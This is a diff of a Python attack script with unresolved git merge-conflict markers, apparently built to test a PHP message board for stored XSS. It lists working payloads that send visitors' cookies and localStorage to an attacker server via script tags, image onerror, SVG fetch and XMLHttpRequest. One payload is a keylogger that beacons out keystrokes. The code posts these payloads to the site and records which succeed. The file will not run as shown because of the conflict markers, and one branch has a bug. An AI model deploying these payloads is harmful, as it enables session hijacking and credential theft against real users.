@@ -1373,19 +1373,31 @@ php_flag engine on
             return False
         
         post_url = f"{self.base_url}/new_post.php"
+<<<<<<< HEAD
         comment_url = f"{self.base_url}/add_comment.php"
+=======
+        comment_url = f"{self.base_url}/comment.php"
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         profile_url = f"{self.base_url}/profile.php"
         
         print("[*] Testing XSS payloads for cookie/session theft...")
         
         # attacker_server에서 http:// 제거
+<<<<<<< HEAD
         # attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+=======
+        attacker_host = self.attacker_server.replace('http://', '').replace('https://', '')
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         
         # 다양한 XSS 페이로드
         xss_payloads = [
             # 기본 쿠키 탈취
             (
+<<<<<<< HEAD
                 f'<script>document.location="{self.attacker_server}?c="+document.cookie</script>',
+=======
+                f'<script>document.location="{self.attacker_server}/steal?c="+document.cookie</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'Basic cookie stealing'
             ),
             
@@ -1397,37 +1409,61 @@ php_flag engine on
             
             # Image 태그 이용
             (
+<<<<<<< HEAD
                 f'<img src=x onerror="this.src=\'{self.attacker_server}?c=\'+document.cookie">',
+=======
+                f'<img src=x onerror="this.src=\'{self.attacker_server}/img?c=\'+document.cookie">',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'Image tag XSS'
             ),
             
             # SVG 이용
             (
+<<<<<<< HEAD
                 f'<svg onload="fetch(\'{self.attacker_server}\',{{method:\'POST\',body:document.cookie}})">',
+=======
+                f'<svg onload="fetch(\'{self.attacker_server}/svg\',{{method:\'POST\',body:document.cookie}})">',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'SVG with fetch API'
             ),
             
             # 이벤트 핸들러
             (
+<<<<<<< HEAD
                 f'<div onmouseover="new Image().src=\'{self.attacker_server}?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+=======
+                f'<div onmouseover="new Image().src=\'{self.attacker_server}/mouse?c=\'+escape(document.cookie)">마우스를 올려보세요!</div>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'Event handler XSS'
             ),
             
             # XMLHttpRequest (여러 줄 문자열)
             (
+<<<<<<< HEAD
                 f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}",true);x.send("c="+document.cookie)</script>',
+=======
+                f'<script>var x=new XMLHttpRequest();x.open("POST","{self.attacker_server}/xhr",true);x.send("c="+document.cookie)</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'XMLHttpRequest cookie theft'
             ),
             
             # LocalStorage 탈취 (간단 버전)
             (
+<<<<<<< HEAD
                 f'<script>fetch("{self.attacker_server}",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+=======
+                f'<script>fetch("{self.attacker_server}/steal",{{method:"POST",body:JSON.stringify({{c:document.cookie,l:localStorage}})}})</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'Cookie and localStorage theft'
             ),
             
             # 키로거 (간단 버전)
             (
+<<<<<<< HEAD
                 f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}?k="+btoa(k);k=""}}}}</script>',
+=======
+                f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10){{new Image().src="{self.attacker_server}/key?k="+btoa(k);k=""}}}}</script>',
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                 'Keylogger injection'
             ),
             
@@ -1462,10 +1498,17 @@ php_flag engine on
                 '<body onload="alert(document.cookie)">',
                 'Body onload event'
             ),
+<<<<<<< HEAD
             # (
             #     '<input onfocus="alert(document.cookie)" autofocus>',
             #     'Autofocus input'
             # ),
+=======
+            (
+                '<input onfocus="alert(document.cookie)" autofocus>',
+                'Autofocus input'
+            ),
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
             (
                 '<a href="javascript:alert(document.cookie)">Click me</a>',
                 'JavaScript URL'
@@ -1475,6 +1518,7 @@ php_flag engine on
                 'Data URL iframe'
             )
         ]
+<<<<<<< HEAD
 
         xss_payload_comment = [
             # young /for comments
@@ -1537,6 +1581,11 @@ php_flag engine on
             
             except Exception as e:
                 print(f"[-] Error: {str(e)[:50]}")
+=======
+        
+        success_count = 0
+        successful_payloads = []
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
         
         # 1. 게시글에 XSS 시도
         for payload, description in xss_payloads:
@@ -1555,9 +1604,13 @@ php_flag engine on
                     check = self.session.get(f"{self.base_url}/index.php")
                     
                     # XSS 페이로드가 그대로 있는지 확인 (필터링 안됨)
+<<<<<<< HEAD
                     # if any(indicator in check.text.lower() for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
                     xss_soup = BeautifulSoup(check.txt, "html.parser")
                     if xss_soup.find('script') or xss_soup.find(attrs={"onerror": True}) or xss_soup.find(attrs={"onload": True}) or xss_soup.find(attrs={"onmouseover": True}) or xss_soup.find(attrs={"onfocus": True}):
+=======
+                    if any(indicator in check.text for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                         print(f"[+] XSS payload injected successfully!")
                         success_count += 1
                         successful_payloads.append(description)
@@ -1569,7 +1622,11 @@ php_flag engine on
                             'type': 'Stored XSS',
                             'impact': 'CRITICAL - Cookie/Session theft possible',
                             'cvss_score': 9.0,
+<<<<<<< HEAD
                             'attack_vector': f'{self.attacker_server}'
+=======
+                            'attack_vector': f'{self.attacker_server}/steal'
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                         }
                         self.vulnerabilities['xss'].append(vuln_info)
                         
@@ -1580,13 +1637,22 @@ php_flag engine on
                             {
                                 'payload_type': description,
                                 'target': 'new_post',
+<<<<<<< HEAD
                                 'steal_endpoint': f'{self.attacker_server}'
+=======
+                                'steal_endpoint': f'{self.attacker_server}/steal'
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                             }
                         )
                         
                         # 첫 번째 성공 후 빠르게 다른 것들도 테스트
+<<<<<<< HEAD
                         # if success_count >= 3:
                         #     break
+=======
+                        if success_count >= 3:
+                            break
+>>>>>>> eea88d3d798c92206cd9c59f03a6d571a4b5205c
                     else:
                         print(f"[-] Payload filtered or encoded")
                         
